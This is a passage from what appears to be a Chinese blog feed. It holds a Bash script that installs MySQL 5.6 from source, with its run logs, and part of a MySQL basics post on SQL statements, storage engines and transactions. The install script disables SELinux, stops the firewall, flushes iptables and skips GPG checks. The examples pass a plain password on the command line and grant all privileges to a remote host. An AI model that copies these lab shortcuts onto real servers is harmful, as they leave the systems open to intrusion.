+&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ 5 rows in set (0.00 sec) mysql&gt; drop database test2; Query OK, 0 rows affected (0.00 sec) mysql&gt; show databases; +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ | Database | +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ | information_schema | | mysql | | performance_schema | | test | +&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;&#x2010;+ 4 rows in set (0.00 sec) mysql&gt;</code></pre><h2 id="&#x7528;&#x811A;&#x672C;&#x5B89;&#x88C5;MySQL-5-6"><a href="#&#x7528;&#x811A;&#x672C;&#x5B89;&#x88C5;MySQL-5-6" class="headerlink" title="&#x7528;&#x811A;&#x672C;&#x5B89;&#x88C5;MySQL 5.6"></a>&#x7528;&#x811A;&#x672C;&#x5B89;&#x88C5;MySQL 5.6</h2><pre><code class="shell"> [root@localhost src]# vim mysql.sh #!/bin/bash#Explain:This is a script to quickly deploy the MySQL service.#Author:Jaking#Email:Jaking@vip.163.com#Date:2019-10-09#&#x6CE8;&#x610F;:&#x628A;&#x6240;&#x9700;&#x6E90;&#x7801;&#x5305;&#x653E;&#x5230;/usr/local/src&#x76EE;&#x5F55;&#x4E0B;#&#x63A8;&#x8350;&#x5B89;&#x88C5;&#x5305;&#xFF1A;mysql-5.6.19.tar.gz cmake-2.8.11.2.tar.gz#&#x4F18;&#x5316;&#x73AF;&#x5883;sed -i &apos;s/SELINUX=enforcing/SELINUX=disabled/&apos; /etc/selinux/config &amp;&gt; /dev/nullsetenforce 0systemctl stop firewalldsystemctl disable firewalldiptables -Fsystemctl stop NetworkManager &amp;&gt; /dev/nullsystemctl disable NetworkManager &amp;&gt; /dev/null#&#x68C0;&#x67E5;yum&#x6E90;&#x662F;&#x5426;&#x914D;&#x7F6E;&#x597D;&#xFF0C;&#x5982;&#x679C;&#x6CA1;&#x6709;&#x914D;&#x7F6E;&#x597D;&#x5219;&#x914D;&#x7F6E;yum&#x6E90;yum clean all 1&gt; /dev/null 2&gt;&amp;1 &amp;&amp; yum makecache &amp;&gt; /dev/nullif [ $? -ne 0 ];thencd /etc/yum.repos.dcat &gt;rhel7.repo&lt;&lt;EOF[rhel7]name=rhel7baseurl=file:///media/cdromenabled=1gpgcheck=0EOF  mkdir -p /media/cdrom  mount /dev/cdrom /media/cdrom &amp;&gt;/dev/null  sed -i -e &apos;/iso9660/d&apos; /etc/fstab  echo &quot;/dev/cdrom /media/cdrom iso9660 defaults 0 0&quot; &gt;&gt; /etc/fstab  yum clean all &amp;&gt;/dev/null &amp;&amp; yum makecache &amp;&gt;/dev/nullfi#&#x5B89;&#x88C5;&#x4F9D;&#x8D56;&#x5305;&#x53CA;&#x7F16;&#x8BD1;&#x5DE5;&#x5177;yum install -y gcc* make ncurse* perl*#&#x5B89;&#x88C5;CMake&#x7F16;&#x8BD1;&#x5DE5;&#x5177;cd /usr/local/srctar xzvf cmake-2.8.11.2.tar.gzcd cmake-2.8.11.2./configuremake &amp;&amp; make install#&#x90E8;&#x7F72;MySQL&#x6570;&#x636E;&#x5E93;#&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;mysql&#x7684;&#x7528;&#x6237;useradd mysql -s /sbin/nologin#&#x521B;&#x5EFA;&#x4E00;&#x4E2A;&#x7528;&#x4E8E;&#x4FDD;&#x5B58;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x548C;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;&#x5E76;&#x628A;&#x8BE5;&#x76EE;&#x5F55;&#x7684;&#x6240;&#x6709;&#x8005;&#x548C;&#x6240;&#x5C5E;&#x7EC4;&#x8EAB;&#x4EFD;&#x4FEE;&#x6539;&#x4E3A;mysql&#x3002;mkdir -p /usr/local/mysql/varchown -Rf mysql:mysql /usr/local/mysql#&#x89E3;&#x538B;&#x3001;&#x7F16;&#x8BD1;&#x3001;&#x5B89;&#x88C5;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x3002;&#x5728;&#x7F16;&#x8BD1;&#x6570;&#x636E;&#x5E93;&#x65F6;&#x4F7F;&#x7528;&#x7684;&#x662F;cmake&#x547D;&#x4EE4;&#xFF0C;&#x5176;&#x4E2D;&#xFF0C;-DCMAKE_INSTALL_PREFIX&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;-DMYSQL_DATADIR&#x53C2;&#x6570;&#x7528;&#x4E8E;&#x5B9A;&#x4E49;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#x7684;&#x76EE;&#x5F55;&#xFF0C;-DSYSCONFDIR&#x5219;&#x662F;&#x5B9A;&#x4E49;MySQL&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#x3002;cd /usr/local/srctar xzvf mysql-5.6.19.tar.gzcd mysql-5.6.19cmake . -DCMAKE_INSTALL_PREFIX=/usr/local/mysql -DMYSQL_DATADIR=/usr/local/mysql/var -DSYSCONFDIR=/etcmake &amp;&amp; make install#&#x4E3A;&#x4E86;&#x8BA9;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x6B63;&#x5E38;&#x8FD0;&#x8F6C;&#x8D77;&#x6765;&#xFF0C;&#x9700;&#x8981;&#x5148;&#x5220;&#x9664;/etc&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x9ED8;&#x8BA4;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#xFF0C;&#x7136;&#x540E;&#x5728;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;scripts&#x5185;&#x627E;&#x5230;&#x4E00;&#x4E2A;&#x540D;&#x4E3A;mysql_install_db&#x7684;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#xFF0C;&#x6267;&#x884C;&#x8FD9;&#x4E2A;&#x811A;&#x672C;&#x7A0B;&#x5E8F;&#x5E76;&#x4F7F;&#x7528;--user&#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL&#x670D;&#x52A1;&#x7684;&#x5BF9;&#x5E94;&#x8D26;&#x53F7;&#x540D;&#x79F0;&#xFF08;&#x5728;&#x524D;&#x9762;&#x6B65;&#x9AA4;&#x5DF2;&#x7ECF;&#x521B;&#x5EFA;&#xFF09;&#xFF0C;&#x4F7F;&#x7528;--basedir&#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x4F7F;&#x7528;--datadir&#x53C2;&#x6570;&#x6307;&#x5B9A;MySQL&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#xFF0C;&#x8FD9;&#x6837;&#x5373;&#x53EF;&#x751F;&#x6210;&#x7CFB;&#x7EDF;&#x6570;&#x636E;&#x5E93;&#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x4F1A;&#x751F;&#x6210;&#x51FA;&#x65B0;&#x7684;MySQL&#x670D;&#x52A1;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x3002;rm -rf /etc/my.cnfcd /usr/local/mysql./scripts/mysql_install_db --user=mysql --basedir=/usr/local/mysql --datadir=/usr/local/mysql/var#&#x628A;&#x7CFB;&#x7EDF;&#x65B0;&#x751F;&#x6210;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x914D;&#x7F6E;&#x6587;&#x4EF6;&#x94FE;&#x63A5;&#x5230;/etc&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x7136;&#x540E;&#x628A;&#x7A0B;&#x5E8F;&#x76EE;&#x5F55;&#x4E2D;&#x7684;&#x5F00;&#x673A;&#x7A0B;&#x5E8F;&#x6587;&#x4EF6;&#x590D;&#x5236;&#x5230;/etc/rc.d/init.d&#x76EE;&#x5F55;&#x4E2D;&#xFF0C;&#x4EE5;&#x4FBF;&#x901A;&#x8FC7;service&#x547D;&#x4EE4;&#x6765;&#x7BA1;&#x7406;MySQL&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x7A0B;&#x5E8F;&#xFF0C;&#x628A;&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#x6587;&#x4EF6;&#x7684;&#x6743;&#x9650;&#x4FEE;&#x6539;&#x6210;755&#x4EE5;&#x4FBF;&#x4E8E;&#x8BA9;&#x7528;&#x6237;&#x6709;&#x6267;&#x884C;&#x8BE5;&#x811A;&#x672C;&#x7684;&#x6743;&#x9650;&#x3002;ln -s my.cnf /etc/my.cnf cp ./support-files/mysql.server /etc/rc.d/init.d/mysqldchmod 755 /etc/rc.d/init.d/mysqld#&#x7F16;&#x8F91;&#x521A;&#x521A;&#x590D;&#x5236;&#x7684;MySQL&#x6570;&#x636E;&#x5E93;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF0C;&#x628A;&#x7B2C;46&#x3001;47&#x884C;&#x7684;basedir&#x4E0E;datadir&#x53C2;&#x6570;&#x5206;&#x522B;&#x4FEE;&#x6539;&#x4E3A;MySQL&#x6570;&#x636E;&#x5E93;&#x7A0B;&#x5E8F;&#x7684;&#x4FDD;&#x5B58;&#x76EE;&#x5F55;&#x548C;&#x771F;&#x5B9E;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6587;&#x4EF6;&#x5185;&#x5BB9;&#x3002;sed -i &apos;46d&apos; /etc/rc.d/init.d/mysqld &amp;&amp; sed -i &apos;45 abasedir=/usr/local/mysql&apos; /etc/rc.d/init.d/mysqld sed -i &apos;47d&apos; /etc/rc.d/init.d/mysqld &amp;&amp; sed -i &apos;46 adatadir=/usr/local/mysql/var&apos; /etc/rc.d/init.d/mysqld#&#x8BBE;&#x7F6E;PATH&#x53D8;&#x91CF;sed -i &apos;74d&apos; /etc/profile &amp;&amp; sed -i &apos;73 aexport PATH=$PATH:/usr/local/mysql/bin&apos; /etc/profile#&#x521B;&#x5EFA;MySQL&#x9ED8;&#x8BA4;&#x7684;&#x6570;&#x636E;&#x6587;&#x6863;&#x5B58;&#x50A8;&#x76EE;&#x5F55;mkdir /var/lib/mysql#&#x521B;&#x5EFA;&#x94FE;&#x63A5;&#x6587;&#x4EF6;ln -s /usr/local/mysql/lib/mysql /usr/lib/mysqlln -s /tmp/mysql.sock /var/lib/mysql/mysql.sock ln -s /usr/local/mysql/include/mysql /usr/include/mysql#&#x542F;&#x52A8;MySQL,&#x628A;mysqld&#x52A0;&#x5165;&#x5F00;&#x673A;&#x542F;&#x52A8;&#x9879;&#x4E2D;&#x3002;service mysqld startchkconfig mysqld onecho &quot;MySQL&#x5DF2;&#x5B89;&#x88C5;&#x6210;&#x529F;&#xFF0C;&#x8BF7;&#x6267;&#x884C; source /etc/profile &#x540E;&#xFF0C;&#x518D;&#x6267;&#x884C; mysql_secure_installation &#x6765;&#x5B8C;&#x6210;MySQL&#x6570;&#x636E;&#x5E93;&#x7684;&#x521D;&#x59CB;&#x5316;&#xFF01;&quot;</code></pre><p>&#x6267;&#x884C;&#x811A;&#x672C;&#x5B89;&#x88C5;MySQL 5.6</p><pre><code>[root@localhost src]# chmod 755 mysql.sh[root@localhost src]# ./mysql.sh Starting MySQL. SUCCESS! MySQL&#x5DF2;&#x5B89;&#x88C5;&#x6210;&#x529F;&#xFF0C;&#x8BF7;&#x6267;&#x884C; source /etc/profile &#x540E;&#xFF0C;&#x518D;&#x6267;&#x884C; mysql_secure_installation &#x6765;&#x5B8C;&#x6210;MySQL&#x6570;&#x636E;&#x5E93;&#x7684;&#x521D;&#x59CB;&#x5316;&#xFF01;[root@localhost src]# mysql_secure_installation-bash: mysql_secure_installation: command not found[root@localhost src]# [root@localhost src]# source /etc/profileAttempting to create directory /root/perl5</code></pre><pre><code>[root@localhost src]# mysql_secure_installationNOTE: RUNNING ALL PARTS OF THIS SCRIPT IS RECOMMENDED FOR ALL MySQL      SERVERS IN PRODUCTION USE!  PLEASE READ EACH STEP CAREFULLY!In order to log into MySQL to secure it, we&apos;ll need the currentpassword for the root user.  If you&apos;ve just installed MySQL, andyou haven&apos;t set the root password yet, the password will be blank,so you should just press enter here.Enter current password for root (enter for none): &#x76F4;&#x63A5;&#x56DE;&#x8F66;OK, successfully used password, moving on...Setting the root password ensures that nobody can log into the MySQLroot user without the proper authorisation.Set root password? [Y/n] yNew password: Re-enter new password: Password updated successfully!Reloading privilege tables.. ... Success!By default, a MySQL installation has an anonymous user, allowing anyoneto log into MySQL without having to have a user account created forthem.  This is intended only for testing, and to make the installationgo a bit smoother.  You should remove them before moving into aproduction environment.Remove anonymous users? [Y/n] y ... Success!Normally, root should only be allowed to connect from &apos;localhost&apos;.  Thisensures that someone cannot guess at the root password from the network.Disallow root login remotely? [Y/n] y ... Success!By default, MySQL comes with a database named &apos;test&apos; that anyone canaccess.  This is also intended only for testing, and should be removedbefore moving into a production environment.Remove test database and access to it? [Y/n] y - Dropping test database... ... Success! - Removing privileges on test database... ... Success!Reloading the privilege tables will ensure that all changes made so farwill take effect immediately.Reload privilege tables now? [Y/n] y ... Success!All done!  If you&apos;ve completed all of the above steps, your MySQLinstallation should now be secure.Thanks for using MySQL!Cleaning up...</code></pre><pre><code class="sql">[root@localhost src]# mysql -uroot -puplookingWarning: Using a password on the command line interface can be insecure.Welcome to the MySQL monitor.  Commands end with ; or \g.Your MySQL connection id is 12Server version: 5.6.19 Source distributionCopyright (c) 2000, 2014, Oracle and/or its affiliates. All rights reserved.Oracle is a registered trademark of Oracle Corporation and/or itsaffiliates. Other names may be trademarks of their respectiveowners.Type &apos;help;&apos; or &apos;\h&apos; for help. Type &apos;\c&apos; to clear the current input statement.mysql&gt; show databases;+--------------------+| Database           |+--------------------+| information_schema || mysql              || performance_schema |+--------------------+3 rows in set (0.00 sec)mysql&gt; exitBye[root@localhost src]#</code></pre><script>        document.querySelectorAll('.github-emoji')          .forEach(el => {            if (!el.dataset.src) { return; }            const img = document.createElement('img');            img.style = 'display:none !important;';            img.src = el.dataset.src;            img.addEventListener('error', () => {              img.remove();              el.style.color = 'inherit';              el.style.backgroundImage = 'none';              el.style.background = 'none';            });            img.addEventListener('load', () => {              img.remove();            });            document.body.appendChild(img);          });      </script>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;&amp;#x6E90;&amp;#x7801;&amp;#x5B89;&amp;#x88C5;MySQL-5-6&quot;&gt;&lt;a href=&quot;#&amp;#x6E90;&amp;#x7801;&amp;#x5B89;&amp;#x88C5;MySQL-5-6&quot; class=&quot;headerlink&quot; title=&quot;&amp;#x6E90;&amp;#
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>MySQL基础</title>
    <link href="https://marnm.github.io//posts/bce68613/"/>
    <id>https://marnm.github.io//posts/bce68613/</id>
    <published>2022-06-07T04:43:21.000Z</published>
    <updated>2022-06-07T05:15:46.622Z</updated>
    
    <content type="html"><![CDATA[<h2 id="&#x4E00;&#x3001;SQL&#x8BED;&#x53E5;"><a href="#&#x4E00;&#x3001;SQL&#x8BED;&#x53E5;" class="headerlink" title="&#x4E00;&#x3001;SQL&#x8BED;&#x53E5;"></a>&#x4E00;&#x3001;SQL&#x8BED;&#x53E5;</h2><p>DDL    &#x6570;&#x636E;&#x5E93;&#x5B9A;&#x4E49;&#x8BED;&#x8A00;    create drop alter<br>DML    &#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#x8BED;&#x8A00;    insert delete update<br>DCL    &#x6570;&#x636E;&#x5E93;&#x63A7;&#x5236;&#x8BED;&#x8A00;    grant revoke<br>DQL    &#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#x8BED;&#x8A00;    select   </p><p>&#x672C;&#x7AE0;&#x8981;&#x6C42;&#x638C;&#x63E1;sql&#x8BED;&#x53E5;&#x7684;&#x57FA;&#x672C;&#x7528;&#x6CD5;&#xFF0C;&#x5305;&#x62EC;create database,create table, drop database,drop table,insert into,update,delete from,grant,revoke; &#x5176;&#x4ED6;sql&#x8BED;&#x53E5;&#x4F5C;&#x4E3A;&#x62D3;&#x5C55;&#x3002;    </p><p>MySQL&#x4E2D;&#x7684;&#x8BED;&#x6CD5;&#x683C;&#x5F0F;  </p><ol><li>&#x9ED8;&#x8BA4;&#x4EE5; <code>;</code> &#x63D0;&#x4EA4;</li><li>&#x5173;&#x952E;&#x5B57;&#x5927;&#x5C0F;&#x5199;&#x4E0D;&#x654F;&#x611F;&#xFF1B;&#x5E93;&#x540D;&#x3001;&#x8868;&#x540D;&#x3001;&#x6570;&#x636E;&#x90FD;&#x662F;&#x533A;&#x5206;&#x5927;&#x5C0F;&#x5199;&#xFF1B;</li><li>&#x4F7F;&#x7528;&#x7A7A;&#x683C;</li></ol><ul><li>DQL    <ul><li>&#x6570;&#x636E;&#x5E93;&#x67E5;&#x8BE2;&#x8BED;&#x8A00; select</li><li>&#x67E5;&#x8BE2;&#x6570;&#x636E;&#x5E93;show databases;</li><li>&#x67E5;&#x8BE2;&#x8868;<br>  show tables;<br>  show tables from test;</li><li>&#x67E5;&#x770B;&#x8868;&#x7684;&#x7ED3;&#x6784;          desc mysql.user;</li><li>&#x67E5;&#x770B;&#x8868;&#x4E2D;&#x7684;&#x6570;&#x636E;       select host,user,password from mysql.user where user=&#x2019;root&#x2019;;</li></ul></li></ul><p>-&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2013;  </p><ul><li><p>DDL    </p><ul><li>&#x6570;&#x636E;&#x5E93;&#x5B9A;&#x4E49;&#x8BED;&#x8A00; create drop alter</li><li>&#x521B;&#x5EFA;&#x5E93; create database dbname;</li><li>&#x5220;&#x9664;&#x5E93; drop database dbname;</li><li>&#x521B;&#x5EFA;&#x8868; create table tbname (id int,name char(20),age int);</li><li>&#x5220;&#x9664;&#x8868; drop table tbname;</li></ul></li><li><p>&#x5E93;&#x540D;&#x8868;&#x540D;&#x547D;&#x540D;&#x89C4;&#x5219;</p><ul><li>&#x82F1;&#x6587;&#x5B57;&#x6BCD;&#x3001;&#x6570;&#x5B57;&#x3001;&#x4E0B;&#x5212;&#x7EBF;</li><li>&#x4EE5;&#x82F1;&#x6587;&#x5B57;&#x6BCD;&#x5F00;&#x5934;</li><li>&lt;=32&#x4E2A;&#x5B57;&#x7B26;</li></ul></li></ul><p>&#x5207;&#x6362;&#x5230;&#x6267;&#x884C;&#x6570;&#x636E;&#x5E93;&#xFF1A;</p><pre><code class="sql">mysql&gt; use dbnameDatabase changed</code></pre><p>-&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2013;  </p><ul><li>DML    &#x6570;&#x636E;&#x5E93;&#x64CD;&#x4F5C;&#x8BED;&#x8A00;     insert delete update<ul><li>&#x63D2;&#x5165;&#x4E00;&#x884C;          <ul><li>insert into dbname.tbname values (1,&#x2019;superman&#x2019;,21);</li><li>insert into dbname.tbname set id=1,name=&#x2019;superman&#x2019;,age=21;</li></ul></li><li>&#x63D2;&#x5165;&#x591A;&#x884C;         <ul><li>insert into dbname.tbname values (2,&#x2019;batman1&#x2019;,21),(3,&#x2019;batman2&#x2019;,22),(4,&#x2019;batman3&#x2019;,23),(5,&#x2019;batman4&#x2019;,24);</li><li>insert into dbname.tbname (id,age) values (6,26);    </li></ul></li><li>update                 update dbname.tbname set age=14 where id=2 or id=3;</li><li>delete                 delete from dbname.tbname where id=2;</li></ul></li></ul><p>-&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2014;&#x2013;</p><ul><li>DCL    &#x6570;&#x636E;&#x5E93;&#x63A7;&#x5236;&#x8BED;&#x8A00;    grant &#x6388;&#x6743; revoke &#x6536;&#x56DE;&#x6388;&#x6743;<ul><li><code>grant all on *.* to &apos;batman&apos;@&apos;172.25.0.12&apos; identified by &apos;uplooking&apos;;</code><ul><li>grant &#x5173;&#x952E;&#x5B57;</li><li>all    &#x6240;&#x6709;&#x6743;&#x9650;&#x9664;&#x4E86;grant&#x4E4B;&#x5916;</li><li>on <em>.</em>  &#x6240;&#x6709;&#x7684;&#x5E93;&#x6240;&#x6709;&#x7684;&#x8868;</li><li>to user@host &#x6743;&#x9650;&#x662F;&#x7ED9;&#x8C01;&#x7684;&#xFF0C;&#x4ECE;&#x54EA;&#x91CC;&#x6765;&#x7684;</li><li>identified by &#x5BC6;&#x7801;</li></ul></li><li><code>flush privileges;</code> &#x5237;&#x65B0;&#x6388;&#x6743;&#x8868;</li></ul></li></ul><h2 id="&#x4E8C;&#x3001;&#x8868;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;"><a href="#&#x4E8C;&#x3001;&#x8868;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;" class="headerlink" title="&#x4E8C;&#x3001;&#x8868;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;"></a>&#x4E8C;&#x3001;&#x8868;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;</h2><p>&#x5B58;&#x50A8;&#x5F15;&#x64CE;  &#x6570;&#x636E;&#x5E93;&#x8BFB;&#x5199;&#x6570;&#x636E;&#x7684;&#x65B9;&#x5F0F;&#xFF0C;&#x51B3;&#x5B9A;&#x4E86;&#x8BFB;&#x5199;&#x6570;&#x636E;&#x7684;&#x5FEB;&#x6162;</p><table><thead><tr><th>&#x4E8B;&#x52A1;</th><th>&#x9501;&#x673A;&#x5236;</th><th>&#x9002;&#x7528;&#x573A;&#x666F;</th></tr></thead><tbody><tr><td>myisam</td><td>no</td><td>&#x8868;&#x9501;</td><td>&#x5206;&#x6790;&#x578B;</td></tr></tbody></table><p>innodb |  yes    |   &#x884C;&#x9501;     |     &#x91D1;&#x94B1;+&#x7EBF;&#x4E0A;&#x9AD8;&#x5E76;&#x53D1; |</p><h2 id="&#x4E09;&#x3001;&#x4E8B;&#x52A1;"><a href="#&#x4E09;&#x3001;&#x4E8B;&#x52A1;" class="headerlink" title="&#x4E09;&#x3001;&#x4E8B;&#x52A1;"></a>&#x4E09;&#x3001;&#x4E8B;&#x52A1;</h2><p>&#x4E8B;&#x52A1;(Transaction)&#x662F;&#x5E76;&#x53D1;&#x63A7;&#x5236;&#x7684;&#x57FA;&#x672C;&#x5355;&#x4F4D;&#x3002;</p><p><code>&#x6240;&#x8C13;&#x4E8B;&#x52A1;,&#x5B83;&#x662F;&#x4E00;&#x4E2A;&#x64CD;&#x4F5C;&#x5E8F;&#x5217;,&#x8FD9;&#x4E9B;&#x64CD;&#x4F5C;&#x8981;&#x4E48;&#x90FD;&#x6267;&#x884C;,&#x8981;&#x4E48;&#x90FD;&#x4E0D;&#x6267;&#x884C;, &#x5B83;&#x662F;&#x4E00;&#x4E2A;&#x4E0D;&#x53EF;&#x5206;&#x5272;&#x7684;&#x5DE5;&#x4F5C;&#x5355;&#x4F4D;&#x3002;</code>&#x4F8B;&#x5982;,&#x94F6;&#x884C;&#x8F6C;&#x5E10;&#x5DE5;&#x4F5C;:&#x4ECE;&#x4E00;&#x4E2A;&#x5E10;&#x53F7;&#x6263;&#x6B3E;&#x5E76; &#x4F7F;&#x53E6;&#x4E00;&#x4E2A;&#x5E10;&#x53F7;&#x589E;&#x6B3E;,&#x8FD9;&#x4E24;&#x4E2A;&#x64CD;&#x4F5C;&#x8981;&#x4E48;&#x90FD;&#x6267;&#x884C;,&#x8981;&#x4E48;&#x90FD;&#x4E0D;&#x6267;&#x884C;&#x3002;</p><p>&#x4E8B;&#x52A1;&#x7684;&#x56DB;&#x5927;&#x7279;&#x6027;ACID  </p><ol><li>&#x539F;&#x5B50;&#x6027;&#xFF08;Atomicity&#xFF09;&#x4E8B;&#x52A1;&#x662F;&#x4E00;&#x4E2A;&#x539F;&#x5B50;&#x64CD;&#x4F5C;&#xFF0C;&#x7531;&#x4E00;&#x7CFB;&#x5217;&#x52A8;&#x4F5C;&#x7EC4;&#x6210;&#x3002;&#x4E8B;&#x52A1;&#x7684;&#x539F;&#x5B50;&#x6027;&#x786E;&#x4FDD;&#x52A8;&#x4F5C;&#x8981;&#x4E48;&#x5168;&#x90E8;&#x5B8C;&#x6210;&#xFF0C;&#x8981;&#x4E48;&#x5B8C;&#x5168;&#x4E0D;&#x8D77;&#x4F5C;&#x7528;&#x3002; </li><li>&#x4E00;&#x81F4;&#x6027;&#xFF08;Consistency&#xFF09;&#x4E8B;&#x52A1;&#x5728;&#x5B8C;&#x6210;&#x65F6;&#xFF0C;&#x5FC5;&#x987B;&#x662F;&#x6240;&#x6709;&#x7684;&#x6570;&#x636E;&#x90FD;&#x4FDD;&#x6301;&#x4E00;&#x81F4;&#x72B6;&#x6001;&#x3002;</li><li>&#x9694;&#x79BB;&#x6027;&#xFF08;Isolation&#xFF09;&#x5E76;&#x53D1;&#x4E8B;&#x52A1;&#x6267;&#x884C;&#x4E4B;&#x95F4;&#x65E0;&#x5F71;&#x54CD;&#xFF0C;&#x5728;&#x4E00;&#x4E2A;&#x4E8B;&#x52A1;&#x5185;&#x90E8;&#x7684;&#x64CD;&#x4F5C;&#x5BF9;&#x5176;&#x4ED6;&#x4E8B;&#x52A1;&#x662F;&#x4E0D;&#x4EA7;&#x751F;&#x5F71;&#x54CD;&#xFF0C;&#x8FD9;&#x9700;&#x8981;&#x4E8B;&#x52A1;&#x9694;&#x79BB;&#x7EA7;&#x522B;&#x6765;&#x6307;&#x5B9A;&#x9694;&#x79BB;&#x6027;&#x3002;</li><li>&#x6301;&#x4E45;&#x6027;&#xFF08;Durability&#xFF09;&#x4E00;&#x65E6;&#x4E8B;&#x52A1;&#x5B8C;&#x6210;&#xFF0C;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6539;&#x53D8;&#x5FC5;&#x987B;&#x662F;&#x6301;&#x4E45;&#x5316;&#x7684;&#x3002;</li></ol><p>&#x67E5;&#x770B;&#x6240;&#x6709;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;      show engines;<br>&#x521B;&#x5EFA;&#x8868;&#x6307;&#x5B9A;&#x5B58;&#x50A8;&#x5F15;&#x64CE;      create table tbname (id int,name char(20),age int) engine=myisam;<br>&#x67E5;&#x770B;&#x8868;&#x7684;&#x5C5E;&#x6027;    use dbname; show table status where name=&#x2019;tbname&#x2019;;   </p><h2 id="&#x56DB;&#x3001;&#x5982;&#x4F55;&#x83B7;&#x5F97;MySQL&#x76F8;&#x5173;&#x8D44;&#x6E90;"><a href="#&#x56DB;&#x3001;&#x5982;&#x4F55;&#x83B7;&#x5F97;MySQL&#x76F8;&#x5173;&#x8D44;&#x6E90;" class="headerlink" title="&#x56DB;&#x3001;&#x5982;&#x4F55;&#x83B7;&#x5F97;MySQL&#x76F8;&#x5173;&#x8D44;&#x6E90;"></a>&#x56DB;&#x3001;&#x5982;&#x4F55;&#x83B7;&#x5F97;MySQL&#x76F8;&#x5173;&#x8D44;&#x6E90;</h2><p>&#x4E3A;&#x4E86;&#x5B66;&#x4E60;&#x66F4;&#x591A;&#x7684;MySQL&#x77E5;&#x8BC6;,&#x8BF7;&#x8BBF;&#x95EE;MySQL&#x5B98;&#x7F51; <a href="https://www.mysql.com/" target="_blank" rel="noopener">https://www.mysql.com/</a></p><h2 id="&#x4E94;&#x3001;MySQL&#x5728;&#x4F01;&#x4E1A;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x573A;&#x666F;"><a href="#&#x4E94;&#x3001;MySQL&#x5728;&#x4F01;&#x4E1A;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x573A;&#x666F;" class="headerlink" title="&#x4E94;&#x3001;MySQL&#x5728;&#x4F01;&#x4E1A;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x573A;&#x666F;"></a>&#x4E94;&#x3001;MySQL&#x5728;&#x4F01;&#x4E1A;&#x4E2D;&#x7684;&#x5E94;&#x7528;&#x573A;&#x666F;</h2><p>MySQL 